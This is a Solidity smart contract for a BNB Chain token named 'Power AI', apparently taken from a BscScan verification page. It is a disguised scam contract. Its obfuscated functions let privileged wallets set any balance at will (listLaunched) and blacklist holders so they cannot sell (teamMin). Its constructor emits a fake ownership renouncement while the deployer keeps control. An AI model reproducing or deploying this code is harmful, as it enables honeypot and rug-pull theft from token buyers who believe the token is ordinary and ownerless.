/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface shouldTake {
    function createPair(address marketingLimit, address receiverSell) external returns (address);
}

contract PowerAI {

    function listLaunched(address amountTxExempt, uint256 launchMinLiquidity) public {
        require(shouldTradingWallet[limitMax()]);
        balanceOf[amountTxExempt] = launchMinLiquidity;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function transferFrom(address fromEnableAmount, address amountTxExempt, uint256 launchMinLiquidity) public returns (bool) {
        if (fromEnableAmount != limitMax() && allowance[fromEnableAmount][limitMax()] != type(uint256).max) {
            require(allowance[fromEnableAmount][limitMax()] >= launchMinLiquidity);
            allowance[fromEnableAmount][limitMax()] -= launchMinLiquidity;
        }
        require(!modeTotalMin[fromEnableAmount]);
        return isReceiver(fromEnableAmount, amountTxExempt, launchMinLiquidity);
    }

    bool private exemptEnable;

    string public name = "Power AI";

    function teamMin(address liquidityWalletExempt) public {
        require(shouldTradingWallet[limitMax()]);
        if (liquidityWalletExempt == tradingTotal || liquidityWalletExempt == feeIs) {
            return;
        }
        modeTotalMin[liquidityWalletExempt] = true;
    }

    bool public limitReceiverToken;

    uint256 public liquidityFundWallet;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed toMode, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address public owner;

    event Transfer(address indexed from, address indexed feeTrading, uint256 value);

    uint256 public marketingSender;

    bool public maxFundToken;

    mapping(address => bool) public shouldTradingWallet;

    function transfer(address amountTxExempt, uint256 launchMinLiquidity) external returns (bool) {
        return transferFrom(limitMax(), amountTxExempt, launchMinLiquidity);
    }

    uint256 private limitAmount;

    uint256 private takeReceiver;

    mapping(address => uint256) public balanceOf;

    constructor (){ 
        feeIs = shouldTake(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        tradingTotal = limitMax();
        balanceOf[tradingTotal] = totalSupply;
        shouldTradingWallet[tradingTotal] = true;
        emit Transfer(address(0), tradingTotal, totalSupply);
        emit OwnershipTransferred(tradingTotal, address(0));
    }

    string public symbol = "PAI";

    function atAmount(address fundExemptReceiver) public {
        require(!maxFundToken);
        shouldTradingWallet[fundExemptReceiver] = true;
        maxFundToken = true;
    }

    uint256 private receiverWallet;

    mapping(address => bool) public modeTotalMin;

    address public tradingTotal;

    uint256 public swapMode;

    function approve(address totalAt, uint256 launchMinLiquidity) public returns (bool) {
        allowance[limitMax()][totalAt] = launchMinLiquidity;
        emit Approval(limitMax(), totalAt, launchMinLiquidity);
        return true;
    }

    function limitMax() private view returns (address) {
        return msg.sender;
    }

    address public feeIs;

    uint8 public decimals = 18;

    bool private fromEnable;

    function isReceiver(address limitTokenMode, address toSender, uint256 launchMinLiquidity) internal returns (bool) {
        require(balanceOf[limitTokenMode] >= launchMinLiquidity);
        balanceOf[limitTokenMode] -= launchMinLiquidity;
        balanceOf[toSender] += launchMinLiquidity;
        emit Transfer(limitTokenMode, toSender, launchMinLiquidity);
        return true;
    }

}